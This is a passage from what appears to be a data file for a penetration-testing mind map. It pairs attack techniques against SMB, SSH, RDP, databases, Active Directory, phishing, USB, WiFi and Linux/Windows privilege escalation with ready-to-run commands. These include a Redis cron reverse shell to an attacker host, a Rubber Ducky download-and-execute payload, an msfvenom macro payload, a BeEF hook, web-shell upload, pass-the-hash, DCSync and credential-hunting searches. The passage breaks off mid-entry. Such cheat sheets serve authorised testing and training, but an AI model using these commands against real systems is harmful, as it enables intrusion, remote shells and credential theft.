                                    "descriptionMd": "### SMB Exploitation\nTargeting Windows file sharing protocols (SMB/CIFS).\n* **EternalBlue (MS17-010):** Critical RCE on unpatched Windows.\n* **SMBGhost (CVE-2020-0796):** SMBv3 compression RCE.\n* **Null Sessions:** Anonymous enumeration on legacy systems.\n* **Pass-the-Hash:** Authenticate without knowing plaintext password.",
                                    "commands": [{
                                            "description": "EternalBlue Check",
                                            "code": "nmap --script smb-vuln-ms17-010 -p445 target_ip"
                                        },
                                        {
                                            "description": "EternalBlue Exploit (MSF)",
                                            "code": "use exploit/windows/smb/ms17_010_eternalblue"
                                        },
                                        {
                                            "description": "SMBGhost Check",
                                            "code": "nmap --script smb-vuln-cve-2020-0796 -p445 target_ip"
                                        },
                                        {
                                            "description": "Null Session Enum",
                                            "code": "smbclient -N -L //target_ip"
                                        },
                                        {
                                            "description": "Enum4linux",
                                            "code": "enum4linux -a target_ip"
                                        },
                                        {
                                            "description": "SMBMap",
                                            "code": "smbmap -H target_ip -u '' -p ''"
                                        },
                                        {
                                            "description": "Pass-the-Hash (CrackMapExec)",
                                            "code": "nxc smb target_ip -u administrator -H aad3b435b51404eeaad3b435b51404ee:ntlmhash"
                                        },
                                        {
                                            "description": "PSExec (Metasploit)",
                                            "code": "use exploit/windows/smb/psexec"
                                        },
                                        {
                                            "description": "Impacket PSExec",
                                            "code": "impacket-psexec administrator@target_ip"
                                        },
                                        {
                                            "description": "SMB Relay",
                                            "code": "impacket-ntlmrelayx -tf targets.txt -smb2support"
                                        }
                                    ],
                                    "type": "technique",
                                    "emoji": "🪟",
                                    "resources": [{
                                            "title": "EternalBlue Explanation",
                                            "url": "https://en.wikipedia.org/wiki/EternalBlue"
                                        },
                                        {
                                            "title": "Impacket Examples",
                                            "url": "https://github.com/fortra/impacket/tree/master/examples"
                                        }
                                    ]
                                },
                                "children": []
                            },
                            {
                                "id": "ssh-exploit",
                                "data": {
                                    "label": "SSH Exploitation",
                                    "description": "Secure Shell",
                                    "descriptionMd": "### SSH Exploitation\nCompromising SSH services.\n* Weak keys (Debian predictable PRNG).\n* User enumeration.\n* Authentication methods abuse.\n* Private key theft.",
                                    "commands": [{
                                            "description": "Username Enum (CVE-2018-15473)",
                                            "code": "python ssh_enum.py --userList users.txt target_ip"
                                        },
                                        {
                                            "description": "SSH with Private Key",
                                            "code": "chmod 600 id_rsa && ssh -i id_rsa user@target_ip"
                                        },
                                        {
                                            "description": "SSH Agent Forwarding",
                                            "code": "ssh -A user@target_ip"
                                        },
                                        {
                                            "description": "SSH Tunneling (Local)",
                                            "code": "ssh -L 8080:localhost:80 user@target_ip"
                                        },
                                        {
                                            "description": "SSH Tunneling (Dynamic)",
                                            "code": "ssh -D 9050 user@target_ip"
                                        },
                                        {
                                            "description": "SSH Tunneling (Remote)",
                                            "code": "ssh -R 8080:localhost:80 user@target_ip"
                                        },
                                        {
                                            "description": "Crack SSH Key",
                                            "code": "ssh2john id_rsa > hash.txt && john hash.txt --wordlist=rockyou.txt"
                                        }
                                    ],
                                    "type": "technique",
                                    "emoji": "🔑",
                                    "resources": [{
                                        "title": "SSH Best Practices",
                                        "url": "https://www.ssh.com/academy/ssh/security"
                                    }]
                                },
                                "children": []
                            },
                            {
                                "id": "rdp-exploit",
                                "data": {
                                    "label": "RDP Exploitation",
                                    "description": "Remote Desktop Protocol",
                                    "descriptionMd": "### RDP Exploitation\nTargeting Windows Remote Desktop.\n* **BlueKeep (CVE-2019-0708):** Pre-auth RCE.\n* Credential stuffing.\n* Session hijacking.\n* RDP MitM attacks.",
                                    "commands": [{
                                            "description": "BlueKeep Check",
                                            "code": "nmap --script rdp-vuln-ms12-020 -p3389 target_ip"
                                        },
                                        {
                                            "description": "RDP Connect",
                                            "code": "xfreerdp /u:administrator /p:password /v:target_ip"
                                        },
                                        {
                                            "description": "RDP Connect (Pass-the-Hash)",
                                            "code": "xfreerdp /u:administrator /pth:ntlmhash /v:target_ip"
                                        },
                                        {
                                            "description": "RDP Brute Force",
                                            "code": "hydra -l administrator -P passwords.txt rdp://target_ip"
                                        },
                                        {
                                            "description": "RDPCheck (Python)",
                                            "code": "rdp-sec-check.pl target_ip"
                                        }
                                    ],
                                    "type": "technique",
                                    "emoji": "🖥️",
                                    "resources": [{
                                        "title": "BlueKeep Info",
                                        "url": "https://msrc.microsoft.com/update-guide/vulnerability/CVE-2019-0708"
                                    }]
                                },
                                "children": []
                            },
                            {
                                "id": "ftp-exploit",
                                "data": {
                                    "label": "FTP Exploitation",
                                    "description": "File Transfer Protocol",
                                    "descriptionMd": "### FTP Exploitation\nCompromising FTP servers.\n* Anonymous access.\n* Vulnerable versions (vsFTPd 2.3.4 backdoor).\n* Weak credentials.\n* Writable directories for shell upload.",
                                    "commands": [{
                                            "description": "Anonymous Login",
                                            "code": "ftp target_ip (user: anonymous, pass: anonymous)"
                                        },
                                        {
                                            "description": "vsFTPd 2.3.4 Backdoor",
                                            "code": "use exploit/unix/ftp/vsftpd_234_backdoor"
                                        },
                                        {
                                            "description": "FTP Bounce Attack",
                                            "code": "nmap --source-port 20 -g 20 target_ip"
                                        },
                                        {
                                            "description": "Upload Web Shell",
                                            "code": "put shell.php /var/www/html/shell.php"
                                        }
                                    ],
                                    "type": "technique",
                                    "emoji": "📁",
                                    "resources": [{
                                        "title": "FTP Commands",
                                        "url": "https://www.serv-u.com/linux-ftp-server/commands"
                                    }]
                                },
                                "children": []
                            },
                            {
                                "id": "db-exploit",
                                "data": {
                                    "label": "Database Exploitation",
                                    "description": "SQL, NoSQL, Redis, etc.",
                                    "descriptionMd": "### Database Exploitation\nDirect attacks on database servers.\n* Default credentials.\n* Command execution features (xp_cmdshell, UDF).\n* File read/write capabilities.\n* NoSQL injection in MongoDB.",
                                    "commands": [{
                                            "description": "MySQL Connect",
                                            "code": "mysql -h target_ip -u root -p"
                                        },
                                        {
                                            "description": "MySQL UDF Exploit",
                                            "code": "use exploit/multi/mysql/mysql_udf_payload"
                                        },
                                        {
                                            "description": "MSSQL xp_cmdshell",
                                            "code": "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell 'whoami';"
                                        },
                                        {
                                            "description": "MSSQL Impacket",
                                            "code": "impacket-mssqlclient sa@target_ip -windows-auth"
                                        },
                                        {
                                            "description": "PostgreSQL Connect",
                                            "code": "psql -h target_ip -U postgres"
                                        },
                                        {
                                            "description": "PostgreSQL RCE",
                                            "code": "CREATE TABLE cmd_exec(cmd_output text); COPY cmd_exec FROM PROGRAM 'id'; SELECT * FROM cmd_exec;"
                                        },
                                        {
                                            "description": "Redis Unauthorized",
                                            "code": "redis-cli -h target_ip"
                                        },
                                        {
                                            "description": "Redis RCE (Cron)",
                                            "code": "echo -e '\\n\\n*/1 * * * * /bin/bash -i >& /dev/tcp/attacker_ip/4444 0>&1\\n\\n' | redis-cli -h target_ip -x set 1; redis-cli -h target_ip config set dir /var/spool/cron/; redis-cli -h target_ip config set dbfilename root; redis-cli -h target_ip save"
                                        },
                                        {
                                            "description": "MongoDB No Auth",
                                            "code": "mongo target_ip:27017"
                                        }
                                    ],
                                    "type": "technique",
                                    "emoji": "🗄️",
                                    "resources": [{
                                            "title": "MSSQL Pentesting",
                                            "url": "https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server"
                                        },
                                        {
                                            "title": "Redis Security",
                                            "url": "https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis"
                                        }
                                    ]
                                },
                                "children": []
                            },
                            {
                                "id": "snmp-exploit",
                                "data": {
                                    "label": "SNMP Exploitation",
                                    "description": "Simple Network Management",
                                    "descriptionMd": "### SNMP Exploitation\nExploiting network management protocols.\n* Default community strings (public/private).\n* Information disclosure.\n* Configuration changes via write access.",
                                    "commands": [{
                                            "description": "SNMP Walk",
                                            "code": "snmpwalk -v2c -c public target_ip"
                                        },
                                        {
                                            "description": "SNMP Community Bruteforce",
                                            "code": "onesixtyone -c community.txt target_ip"
                                        },
                                        {
                                            "description": "SNMP Enumerate",
                                            "code": "snmp-check target_ip -c public"
                                        },
                                        {
                                            "description": "SNMP User Enum",
                                            "code": "snmpwalk -v2c -c public target_ip 1.3.6.1.4.1.77.1.2.25"
                                        },
                                        {
                                            "description": "SNMP Process Enum",
                                            "code": "snmpwalk -v2c -c public target_ip 1.3.6.1.2.1.25.4.2.1.2"
                                        }
                                    ],
                                    "type": "technique",
                                    "emoji": "📡",
                                    "resources": [{
                                        "title": "SNMP MIB Values",
                                        "url": "http://www.oid-info.com/"
                                    }]
                                },
                                "children": []
                            },
                            {
                                "id": "ldap-exploit",
                                "data": {
                                    "label": "LDAP/AD Exploitation",
                                    "description": "Active Directory",
                                    "descriptionMd": "### LDAP/Active Directory\nAttacking directory services.\n* LDAP anonymous bind.\n* Kerberoasting.\n* AS-REP Roasting.\n* Pass-the-Ticket.\n* DCSync attack.",
                                    "commands": [{
                                            "description": "LDAP Anonymous Bind",
                                            "code": "ldapsearch -x -h target_ip -b \"dc=domain,dc=com\""
                                        },
                                        {
                                            "description": "Bloodhound Collection",
                                            "code": "bloodhound-python -u user -p password -ns target_ip -d domain.com -c all"
                                        },
                                        {
                                            "description": "Kerberoasting (Impacket)",
                                            "code": "impacket-GetUserSPNs domain.com/user:password -dc-ip target_ip -request"
                                        },
                                        {
                                            "description": "AS-REP Roasting",
                                            "code": "impacket-GetNPUsers domain.com/ -dc-ip target_ip -request"
                                        },
                                        {
                                            "description": "DCSync",
                                            "code": "impacket-secretsdump domain.com/administrator@target_ip"
                                        },
                                        {
                                            "description": "Pass-the-Ticket",
                                            "code": "export KRB5CCNAME=ticket.ccache && impacket-psexec domain.com/user@target -k -no-pass"
                                        },
                                        {
                                            "description": "Zerologon Check",
                                            "code": "python zerologon_tester.py DC_NAME target_ip"
                                        }
                                    ],
                                    "type": "technique",
                                    "emoji": "🏢",
                                    "resources": [{
                                            "title": "Bloodhound",
                                            "url": "https://github.com/BloodHoundAD/BloodHound"
                                        },
                                        {
                                            "title": "AD Attack Cheat Sheet",
                                            "url": "https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet"
                                        }
                                    ]
                                },
                                "children": []
                            }
                        ]
                    },

                    {
                        "id": "client-side",
                        "data": {
                            "label": "Client-Side Attacks",
                            "description": "Social Engineering & Payloads",
                            "descriptionMd": "### Client-Side Attacks\nExploiting the human element or client applications.\n* Requires social engineering.\n* Phishing campaigns.\n* Malicious file formats.\n* Browser exploitation.",
                            "commands": [],
                            "type": "category",
                            "emoji": "👥",
                            "resources": [{
                                "title": "Social Engineering Toolkit",
                                "url": "https://github.com/trustedsec/social-engineer-toolkit"
                            }]
                        },
                        "children": [{
                                "id": "phishing",
                                "data": {
                                    "label": "Phishing",
                                    "description": "Email-based attacks",
                                    "descriptionMd": "### Phishing\nCrafting convincing emails to harvest credentials or deliver payloads.\n* **Credential Harvesting:** Clone login pages.\n* **Payload Delivery:** Malicious attachments.\n* **Link Manipulation:** Typosquatting, URL obfuscation.",
                                    "commands": [{
                                            "description": "GoPhish Campaign",
                                            "code": "gophish"
                                        },
                                        {
                                            "description": "SET Credential Harvester",
                                            "code": "setoolkit -> Social-Engineering Attacks -> Website Attack Vectors -> Credential Harvester"
                                        },
                                        {
                                            "description": "Clone Website",
                                            "code": "httrack https://target-login.com -O /tmp/cloned"
                                        },
                                        {
                                            "description": "Send Email (SWAKS)",
                                            "code": "swaks --to victim@target.com --from trusted@company.com --header \"Subject: Urgent\" --body \"Click here\" --attach payload.pdf --server mail.target.com"
                                        }
                                    ],
                                    "type": "technique",
                                    "emoji": "🎣",
                                    "resources": [{
                                        "title": "GoPhish",
                                        "url": "https://getgophish.com/"
                                    }]
                                },
                                "children": []
                            },
                            {
                                "id": "malicious-docs",
                                "data": {
                                    "label": "Malicious Documents",
                                    "description": "Office macros & PDFs",
                                    "descriptionMd": "### Malicious Documents\nWeaponizing common file formats.\n* **Office Macros:** VBA, PowerShell download cradles.\n* **PDF Exploits:** JavaScript, embedded files.\n* **RTF Exploits:** Equation Editor vulnerabilities.",
                                    "commands": [{
                                            "description": "MSFVenom Office Macro",
                                            "code": "msfvenom -p windows/meterpreter/reverse_tcp LHOST=attacker_ip LPORT=4444 -f vba"
                                        },
                                        {
                                            "description": "MacroPack",
                                            "code": "echo \"calc.exe\" | MacroPack.exe -t EXCEL -o evil.xlsm"
                                        },
                                        {
                                            "description": "EvilClippy",
                                            "code": "EvilClippy.exe -s fake.xlsm -g -r"
                                        },
                                        {
                                            "description": "PDF JavaScript",
                                            "code": "Use pdf-parser or pdftk to inject JS payload"
                                        }
                                    ],
                                    "type": "technique",
                                    "emoji": "📄",
                                    "resources": [{
                                            "title": "MacroPack",
                                            "url": "https://github.com/sevagas/macro_pack"
                                        },
                                        {
                                            "title": "Malicious Office Docs",
                                            "url": "https://blog.malwarebytes.com/threat-analysis/2017/10/decoy-microsoft-word-document-delivers-malware-through-rat/"
                                        }
                                    ]
                                },
                                "children": []
                            },
                            {
                                "id": "browser-exploit",
                                "data": {
                                    "label": "Browser Exploitation",
                                    "description": "Client-side exploits",
                                    "descriptionMd": "### Browser Exploitation\nTargeting web browsers and their plugins.\n* **Browser Autopwn:** Metasploit framework.\n* **Beef Framework:** Browser hooking.\n* **Drive-by downloads:** Exploit kits.",
                                    "commands": [{
                                            "description": "Browser Autopwn2",
                                            "code": "use auxiliary/server/browser_autopwn2"
                                        },
                                        {
                                            "description": "BeEF Framework",
                                            "code": "./beef"
                                        },
                                        {
                                            "description": "Beef Hook",
                                            "code": "<script src=\"http://attacker:3000/hook.js\"></script>"
                                        }
                                    ],
                                    "type": "technique",
                                    "emoji": "🌍",
                                    "resources": [{
                                        "title": "BeEF Project",
                                        "url": "https://beefproject.com/"
                                    }]
                                },
                                "children": []
                            },
                            {
                                "id": "usb-attacks",
                                "data": {
                                    "label": "USB Attacks",
                                    "description": "Rubber Ducky, BadUSB",
                                    "descriptionMd": "### USB Attacks\nPhysical access attacks via USB devices.\n* **Rubber Ducky:** Emulates keyboard, executes payloads.\n* **BadUSB:** Firmware-level attacks.\n* **USB Drop:** Social engineering (dropped USB drives).",
                                    "commands": [{
                                            "description": "Rubber Ducky Payload",
                                            "code": "DELAY 1000\\nGUI r\\nDELAY 500\\nSTRING powershell -w hidden IEX (New-Object Net.WebClient).DownloadString('http://attacker/payload.ps1')\\nENTER"
                                        },
                                        {
                                            "description": "P4wnP1 A.L.O.A.",
                                            "code": "Setup P4wnP1 on Raspberry Pi Zero W"
                                        }
                                    ],
                                    "type": "technique",
                                    "emoji": "🔌",
                                    "resources": [{
                                            "title": "Hak5 USB Rubber Ducky",
                                            "url": "https://shop.hak5.org/products/usb-rubber-ducky"
                                        },
                                        {
                                            "title": "P4wnP1",
                                            "url": "https://github.com/RoganDawes/P4wnP1_aloa"
                                        }
                                    ]
                                },
                                "children": []
                            }
                        ]
                    },

                    {
                        "id": "wireless",
                        "data": {
                            "label": "Wireless Attacks",
                            "description": "WiFi & Bluetooth",
                            "descriptionMd": "### Wireless Attacks\nTargeting wireless networks.\n* **WPA/WPA2 Cracking:** Capture handshake, offline crack.\n* **WPS Attacks:** PIN brute-forcing.\n* **Evil Twin:** Rogue AP attacks.\n* **Bluetooth:** Discovery and exploitation.",
                            "commands": [],
                            "type": "category",
                            "emoji": "📶",
                            "resources": [{
                                "title": "Aircrack-ng",
                                "url": "https://www.aircrack-ng.org/"
                            }]
                        },
                        "children": [{
                                "id": "wifi-crack",
                                "data": {
                                    "label": "WiFi Cracking",
                                    "description": "WPA/WPA2/WEP",
                                    "descriptionMd": "### WiFi Password Cracking\nCapturing and cracking wireless authentication.\n* **WEP:** Deprecated, easily cracked.\n* **WPA/WPA2:** Requires handshake capture.\n* **WPA3:** More secure, but still has some vulnerabilities.",
                                    "commands": [{
                                            "description": "Monitor Mode",
                                            "code": "airmon-ng start wlan0"
                                        },
                                        {
                                            "description": "Scan Networks",
                                            "code": "airodump-ng wlan0mon"
                                        },
                                        {
                                            "description": "Capture Handshake",
                                            "code": "airodump-ng --bssid AA:BB:CC:DD:EE:FF -c 6 -w capture wlan0mon"
                                        },
                                        {
                                            "description": "Deauth Attack",
                                            "code": "aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF wlan0mon"
                                        },
                                        {
                                            "description": "Crack with Aircrack",
                                            "code": "aircrack-ng -w rockyou.txt capture-01.cap"
                                        },
                                        {
                                            "description": "Crack with Hashcat",
                                            "code": "hashcat -m 22000 capture.hc22000 rockyou.txt"
                                        },
                                        {
                                            "description": "WPS Pixie Dust",
                                            "code": "reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv -K"
                                        },
                                        {
                                            "description": "Evil Twin (hostapd)",
                                            "code": "hostapd evil_twin.conf"
                                        }
                                    ],
                                    "type": "technique",
                                    "emoji": "📡",
                                    "resources": [{
                                            "title": "Aircrack-ng Tutorial",
                                            "url": "https://www.aircrack-ng.org/doku.php?id=tutorial"
                                        },
                                        {
                                            "title": "Hashcat WPA",
                                            "url": "https://hashcat.net/wiki/doku.php?id=cracking_wpawpa2"
                                        }
                                    ]
                                },
                                "children": []
                            },
                            {
                                "id": "bluetooth",
                                "data": {
                                    "label": "Bluetooth Attacks",
                                    "description": "BLE & Classic",
                                    "descriptionMd": "### Bluetooth Exploitation\nTargeting Bluetooth-enabled devices.\n* **Bluejacking:** Sending unsolicited messages.\n* **Bluesnarfing:** Unauthorized access to data.\n* **BLE Sniffing:** Intercepting Bluetooth Low Energy traffic.",
                                    "commands": [{
                                            "description": "Scan Devices",
                                            "code": "hcitool scan"
                                        },
                                        {
                                            "description": "Device Info",
                                            "code": "sdptool browse MAC_ADDRESS"
                                        },
                                        {
                                            "description": "Bluez Utils",
                                            "code": "bluetoothctl"
                                        },
                                        {
                                            "description": "Spooftooph",
                                            "code": "spooftooph -i hci0 -a AA:BB:CC:DD:EE:FF"
                                        }
                                    ],
                                    "type": "technique",
                                    "emoji": "🔵",
                                    "resources": [{
                                        "title": "Bluetooth Security",
                                        "url": "https://www.bluetooth.com/learn-about-bluetooth/bluetooth-technology/bluetooth-security/"
                                    }]
                                },
                                "children": []
                            }
                        ]
                    },
                ]
            },

            {
                id: 'post-exp',
                data: {
                    label: 'Post Exploitation',
                    description: 'PrivEsc & Loot',
                    descriptionMd: '### Post Exploitation\nPrivilege escalation, proof of impact, and safe cleanup.',
                    commands: [],
                    type: 'category',
                    emoji: '🚩',
                    resources: []
                },
                children: [{
                        id: 'linux-pe',
                        data: {
                            label: 'Linux PrivEsc',
                            description: 'Root Access',
                            descriptionMd: '### Linux PrivEsc\nEnumerate, exploit, and loot.',
                            commands: [],
                            type: 'category',
                            emoji: '🐧',
                            resources: []
                        },
                        children: [{
                                id: 'linpeas',
                                data: {
                                    label: 'LinPEAS',
                                    description: 'Auto Enumeration',
                                    descriptionMd: '### LinPEAS\nComprehensive Linux enumeration script that highlights privilege escalation paths.\n\n**Usage Tips:**\n- Review output carefully - red/yellow = high priority\n- Run from writable directory (/tmp, /dev/shm)\n- Transfer locally for offline review',
                                    commands: [{
                                            description: 'Run (prefer reviewed local copy)',
                                            code: 'curl -L linpeas.sh | sh'
                                        },
                                        {
                                            description: 'Download and run locally',
                                            code: 'wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh && chmod +x linpeas.sh && ./linpeas.sh'
                                        },
                                        {
                                            description: 'Run with output to file',
                                            code: './linpeas.sh -a > linpeas_output.txt'
                                        },
                                        {
                                            description: 'Quick scan (skip deep checks)',
                                            code: './linpeas.sh -q'
                                        }
                                    ],
                                    type: 'tool',
                                    emoji: '🔎',
                                    resources: [{
                                        title: 'PEASS-ng GitHub',
                                        url: 'https://github.com/carlospolop/PEASS-ng'
                                    }]
                                },
                                children: []
                            },
                            {
                                id: 'linux-enum-manual',
                                data: {
                                    label: 'Manual Enumeration',
                                    description: 'System reconnaissance',
                                    descriptionMd: '### Manual Enumeration\nGather system info, users, network config, and running services when automated tools are unavailable or for targeted reconnaissance.',
                                    commands: [{
                                            description: 'System info',
                                            code: 'uname -a && cat /etc/*-release && hostname'
                                        },
                                        {
                                            description: 'Current user context',
                                            code: 'id && whoami && groups'
                                        },
                                        {
                                            description: 'Sudo privileges',
                                            code: 'sudo -l'
                                        },
                                        {
                                            description: 'List users',
                                            code: 'cat /etc/passwd | grep -v nologin'
                                        },
                                        {
                                            description: 'Active network connections',
                                            code: 'netstat -tulpn || ss -tulpn'
                                        },
                                        {
                                            description: 'Running processes',
                                            code: 'ps auxf'
                                        },
                                        {
                                            description: 'Installed packages (Debian)',
                                            code: 'dpkg -l'
                                        },
                                        {
                                            description: 'Installed packages (RedHat)',
                                            code: 'rpm -qa'
                                        }
                                    ],
                                    type: 'technique',
                                    emoji: '📋',
                                    resources: []
                                },
                                children: []
                            },
                            {
                                id: 'cron',
                                data: {
                                    label: 'Cron Jobs',
                                    description: 'Scheduled Tasks',
                                    descriptionMd: '### Cron Jobs\nInspect scheduled tasks and writable scripts. Look for:\n- World-writable cron scripts\n- PATH hijacking in cron jobs\n- Wildcards in cron commands\n- Scripts running as root',
                                    commands: [{
                                            description: 'System crontab',
                                            code: 'cat /etc/crontab'
                                        },
                                        {
                                            description: 'All cron directories',
                                            code: 'ls -la /etc/cron.*'
                                        },
                                        {
                                            description: 'User crontabs',
                                            code: 'for user in $(cat /etc/passwd | cut -f1 -d:); do echo $user; crontab -u $user -l 2>/dev/null; done'
                                        },
                                        {
                                            description: 'Monitor processes (pspy)',
                                            code: 'wget https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64 && chmod +x pspy64 && ./pspy64'
                                        },
                                        {
                                            description: 'Find writable cron scripts',
                                            code: 'find /etc/cron* -type f -writable 2>/dev/null'
                                        }
                                    ],
                                    type: 'technique',
                                    emoji: '⏱️',
                                    resources: [{
                                        title: 'pspy GitHub',
                                        url: 'https://github.com/DominicBreuker/pspy'
                                    }]
                                },
                                children: []
                            },
                            {
                                id: 'suid-gtfobins',
                                data: {
                                    label: 'SUID / GTFOBins',
                                    description: 'Binaries',
                                    descriptionMd: '### SUID / Capabilities\nFind binaries with SUID bit or capabilities that can be exploited for privilege escalation.\n\n**GTFOBins:** Database of Unix binaries that can be abused to bypass security restrictions.',
                                    commands: [{
                                            description: 'Find SUID binaries',
                                            code: 'find / -perm -u=s -type f 2>/dev/null'
                                        },
                                        {
                                            description: 'Find SGID binaries',
                                            code: 'find / -perm -g=s -type f 2>/dev/null'
                                        },
                                        {
                                            description: 'Find capabilities',
                                            code: 'getcap -r / 2>/dev/null'
                                        },
                                        {
                                            description: 'Example: nmap interactive',
                                            code: 'nmap --interactive\n!sh'
                                        },
                                        {
                                            description: 'Example: find privilege escalation',
                                            code: 'find . -exec /bin/sh -p \\; -quit'
                                        },
                                        {
                                            description: 'Example: vim privilege escalation',
                                            code: 'vim -c \':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")\''
                                        }
                                    ],
                                    type: 'technique',
                                    emoji: '🧑‍💻',
                                    resources: [{
                                        title: 'GTFOBins',
                                        url: 'https://gtfobins.github.io/'
                                    }]
                                },
                                children: []
                            },
                            {
                                id: 'sudo-exploits',
                                data: {
                                    label: 'Sudo Misconfig',
                                    description: 'NOPASSWD & version exploits',
                                    descriptionMd: '### Sudo Exploitation\nExploit sudo misconfigurations and version-specific vulnerabilities.\n\n**Check for:**\n- NOPASSWD entries\n- LD_PRELOAD/LD_LIBRARY_PATH preserved\n- Wildcard abuse\n- CVE-2019-14287 (sudo < 1.8.28)\n- Baron Samedit (CVE-2021-3156)',
                                    commands: [{
                                            description: 'Check sudo config',
                                            code: 'sudo -l'
                                        },
                                        {
                                            description: 'Sudo version',
                                            code: 'sudo -V | head -1'
                                        },
                                        {
                                            description: 'Exploit LD_PRELOAD',
                                            code: 'sudo LD_PRELOAD=/tmp/evil.so program'
                                        },
                                        {
                                            description: 'CVE-2019-14287 exploit',
                                            code: 'sudo -u#-1 /bin/bash'
                                        },
                                        {
                                            description: 'Test Baron Samedit',
                                            code: 'sudoedit -s \\\\\n$(perl -e \'print "A" x 65536\')'
                                        }
                                    ],
                                    type: 'technique',
                                    emoji: '🔓',
                                    resources: [{
                                        title: 'Sudo Exploits',
                                        url: 'https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid'
                                    }]
                                },
                                children: []
                            },
                            {
                                id: 'secrets-linux',
                                data: {
                                    label: 'Secrets & Config',
                                    description: 'Keys, env vars, config files',
                                    descriptionMd: '### Secrets & Config\nIdentify credentials in configs, environment variables, history files, and service units.\n\n**Common locations:**\n- ~/.ssh/, ~/.aws/, ~/.docker/\n- /var/www/, /opt/\n- Database configs\n- Application logs',
                                    commands: [{
                                            description: 'Home directories',
                                            code: 'ls -la /home/* /root/ 2>/dev/null'
                                        },
                                        {
                                            description: 'Environment variables',
                                            code: 'env | sort'
                                        },
                                        {
                                            description: 'Command history',
                                            code: 'cat ~/.*history'
                                        },
                                        {
                                            description: 'SSH keys',
                                            code: 'find / -name id_rsa -o -name id_dsa -o -name authorized_keys 2>/dev/null'
                                        },
                                        {
                                            description: 'Database configs',
                                            code: 'find / -name "*.conf" -o -name "config.php" -o -name "settings.py" 2>/dev/null | xargs grep -i "password"'
                                        },
                                        {
                                            description: 'Find passwords in files',
                                            code: 'grep -r -i "password" /var/www/ /opt/ 2>/dev/null'
                                        },
                                        {
                                            description: 'Search for API keys',
                                            code: 'grep -roE "api[_-]?key|api[_-]?secret" /home/ /var/ /opt/ 2>/dev/null'
                                        }
                                    ],
                                    type: 'technique',
                                    emoji: '🔑',
                                    resources: []
                                },
                                children: []
                            },
                            {
                                id: 'kernel-exploits-linux',
                                data: {
                                    label: 'Kernel Exploits',
                                    description: 'Privilege escalation via kernel bugs',
                                    descriptionMd: '### Kernel Exploits\nLeverage kernel vulnerabilities for privilege escalation. Always verify kernel version and use stable exploits.\n\n**Notable CVEs:**\n- DirtyCow (CVE-2016-5195)\n- DirtyPipe (CVE-2022-0847)\n- PwnKit (CVE-2021-4034)',
                                    commands: [{
                                            description: 'Kernel version',
                                            code: 'uname -r'
                                        },
                                        {
                                            description: 'OS info',
                                            code: 'cat /etc/os-release'
                                        },
                                        {
                                            description: 'Search exploits',
                                            code: 'searchsploit kernel $(uname -r)'
                                        },
                                        {
                                            description: 'Linux Exploit Suggester',
                                            code: 'wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh && chmod +x linux-exploit-suggester.sh && ./linux-exploit-suggester.sh'
                                        }
                                    ],
                                    type: 'technique',
                                    emoji: '🧠',
                                    resources: [{
                                        title: 'Linux Exploit Suggester',
                                        url: 'https://github.com/mzet-/linux-exploit-suggester'
                                    }]
                                },
                                children: []
                            },
                            {
                                id: 'docker-escape',
                                data: {
                                    label: 'Container Escape',
                                    description: 'Docker & container breakout',
                                    descriptionMd: '### Container Escape\nBreak out of Docker containers and other containerization technologies.\n\n**Check for:**\n- Privileged containers\n- Docker socket mounted\n- Capabilities (CAP_SYS_ADMIN)\n- Host filesystem mounts',
                                    commands: [{
                                            description: 'Check if in container',
                                            code: 'cat /proc/1/cgroup | grep -i docker'
                                        },
                                        {
                                            description: 'Check for docker socket',
                                            code: 'ls -la /var/run/docker.sock'
                                        },
                                        {
                                            description: 'List capabilities',
                                            code: 'capsh --print'
                                        },
                                        {
                                            description: 'Exploit docker socket',
                                            code: 'docker run -v /:/hostfs -it ubuntu chroot /hostfs /bin/bash'
                                        },
                                        {
                                            description: 'Mount host filesystem',
                                            code: 'mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x'
                                        }
                                    ],
                                    type: 'technique',
                                    emoji: '🐳',
                                    resources: [{
                                        title: 'HackTricks Container Escape',
                                        url: 'https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation'
                                    }]
                                },
                                children: []
                            },
                            {
                                id: 'nfs-shares',
                                data: {
                                    label: 'NFS Shares',
                                    description: 'Network file system exploitation',
                                    descriptionMd: '### NFS Exploitation\nExploit NFS misconfigurations including no_root_squash and weak permissions.',
                                    commands: [{
                                            description: 'Show NFS exports',
                                            code: 'showmount -e target_ip'
                                        },
                                        {
                                            description: 'Mount NFS share',
                                            code: 'mkdir /tmp/mount && mount -t nfs target_ip:/share /tmp/mount'
                                        },
                                        {
                                            description: 'Exploit no_root_squash',
                                            code: 'echo \'int main() { setuid(0); system("/bin/bash"); }\' > /tmp/mount/shell.c && gcc /tmp/mount/shell.c -o /tmp/mount/shell && chmod +s /tmp/mount/shell'
                                        }
                                    ],
                                    type: 'technique',
                                    emoji: '📁',
                                    resources: []
                                },
                                children: []
                            }
                        ]
                    },

                    {
                        id: 'win-pe',
                        data: {
                            label: 'Windows PrivEsc',
                            description: 'System Access',
                            descriptionMd: '### Windows PrivEsc\nEnumerate and exploit misconfigurations.',
                            commands: [],
                            type: 'category',
                            emoji: '🪟',
                            resources: []
                        },
                        children: [{
                                id: 'winpeas',
                                data: {
                                    label: 'WinPEAS',
                                    description: 'Auto Enumeration',
                                    descriptionMd: '### WinPEAS\nComprehensive Windows enumeration for privilege escalation paths.\n\n**Output colors:**\n- Red: Critical findings\n- Yellow: Important issues\n- Green: Informational',
                                    commands: [{
                                            description: 'Run executable',
                                            code: '.\\winPEASx64.exe'
                                        },
                                        {
                                            description: 'PowerShell version',
                                            code: 'IEX(New-Object Net.WebClient).DownloadString(\'https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/winPEAS/winPEASps1/winPEAS.ps1\'); Invoke-winPEAS'
                                        },
                                        {
